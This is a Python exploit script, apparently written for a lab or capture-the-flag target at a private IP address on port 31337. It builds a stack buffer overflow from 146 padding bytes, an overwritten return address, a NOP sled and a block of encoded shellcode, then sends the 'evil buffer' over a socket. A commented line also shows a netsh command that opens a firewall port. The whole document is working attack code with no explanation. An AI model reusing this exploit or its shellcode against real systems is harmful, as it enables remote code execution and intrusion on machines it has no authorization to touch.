import socket

ip = "10.10.109.190"
port = 31337

offset = 146
overflow = b'A' * offset
retn = b'\xc3\x14\x04\x08'
padding = b'\x90' * 15
payload = b'\xd9\xc6\xbb\x64\x76\x18\x10\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x59\x31\x5a\x19\x83\xea\xfc\x03\x5a\x15\x86\x83\xe4\xf8\xc9\x6c\x15\xf9\xb5\x5d\xc7\x9d\xbe\xcc\xd7\xd4\x25\x7b\x45\xeb\x2e\x2e\x7e\x78\x42\xe7\x71\xc9\xe8\xd1\xbc\xca\xdd\xdd\x13\x08\x7c\xa2\x69\x5d\x5e\x9b\xa1\x90\x9f\xdc\x77\xde\x70\xb0\x0c\x72\x9e\xbe\x51\x4f\x9f\x10\xde\xef\xe7\x15\x21\xb8\x63\x5a\xa3\x97\xdb\xe9\xeb\x0f\x50\xb5\xcb\x2e\xb5\xc3\xc5\x45\x05\x85\x5e\x91\xfe\x14\xb7\xeb\xff\x26\xf7\xcd\x30\x45\x5b\xcc\x09\x6e\x43\xba\x61\x8c\xfe\xbd\xb2\xee\x24\x4b\x24\x48\xae\xeb\x80\x68\x63\x6d\x43\x66\xc8\xf9\x0b\x6b\xcf\x2e\x20\x97\x44\xd1\xe6\x11\x1e\xf6\x22\x79\xc4\x97\x73\x27\xab\xa8\x63\x8f\x14\x0d\xe8\x22\x42\x31\x11\xbd\x6b\x6f\x85\x71\xa6\x90\x55\x1e\xb1\xe3\x67\x81\x69\x6c\xcb\x4a\xb4\x6b\x5a\x5c\x47\xa3\xe4\x0d\xb9\x44\x14\x07\x7e\x10\x44\x3f\x57\x19\x0f\xbf\x58\xcc\xa5\xb5\xce\xe5\x30\xcb\xf1\x92\x40\xcb\x1c\x3f\xcd\x2d\x4e\xef\x9d\xe1\x2f\x5f\x5d\x52\xd8\xb5\x52\x8d\xf8\xb5\xb9\xa6\x93\x59\x17\x9e\x0b\xc3\x32\x54\xad\x0c\xe9\x10\xed\x87\x1b\xe4\xa0\x6f\x6e\xf6\xd5\x17\x90\x06\x26\xb2\x90\x6c\x22\x14\xc7\x18\x28\x41\x2f\x87\xd3\xa4\x2c\xc0\x2c\x39\x04\xba\x1b\xaf\x28\xd4\x63\x3f\xa8\x24\x32\x55\xa8\x4c\xe2\x0d\xfb\x69\xed\x9b\x68\x22\x78\x24\xd8\x96\x2b\x4c\xe6\xc1\x1c\xd3\x19\x24\x1f\x14\xe5\xba\x08\xbd\x8d\x44\x09\x3d\x4d\x2f\x89\x6d\x25\xa4\xa6\x82\x85\x45\x6d\xcb\x8d\xcc\xe0\xb9\x2c\xd0\x28\x1f\xf0\xd1\xdf\x84\x03\xab\x90\x3b\xe4\x4c\xb9\x5f\xe5\x4c\xc5\x61\xda\x9a\xfc\x17\x1d\x1f\xbb\x28\x28\x02\xea\xa2\x52\x10\xec\xe6'

postfix = ''



#buffer =  overflow + retn + padding + pyload +

buffer =  overflow + retn + padding + payload
      
# netsh advfirewall firewall add rule nam="ALLOTCP PORT 9999" dir=in action=allow protocol=TCP localport=9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...:")
  #try:
  #  s.recv(1024)
  #except Exception as e:
  #  print("33 - Exception: %s" %e)

  #try:  
  #  s.send(b'NameTest' + b'\r\n')
  #except Exception as e:
  #  print("38 - Exception: %s" %e)

  #try:
  #  s.recv(1024)
  #except Exception as e:
  #  print("42 - Exception: %s" %e)

  try: 
    s.send((buffer + b'\r\n'))
  except Exception as e:
    print("47 - Exception: %s" %e)

  try: 
    s.recv(1024)
  except Exception as e:
    print("52 - Exception: %s" %e)
  s.close()
  #s.send(bytes("NameTest" + "\r\n", "latin-1"))
  #s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")